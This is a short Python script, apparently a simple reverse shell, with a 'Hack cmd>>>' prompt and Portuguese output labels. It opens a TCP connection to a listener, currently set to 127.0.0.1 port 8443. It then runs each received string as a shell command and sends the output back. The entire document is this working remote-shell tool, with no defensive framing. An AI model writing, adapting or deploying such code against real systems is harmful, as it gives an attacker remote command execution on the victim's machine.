import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "127.0.0.1"
port = 8443

sock.connect((host, port))
sock.send(b'Hack cmd>>> ')

while True:
    data = sock.recv(1024)
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = b"\n" + b"Comando executado: " + proc.stdout.read() + proc.stderr.read() + b"\n"

    sock.send(stdout_value)
    sock.send(b"Hack cmd>>> ")
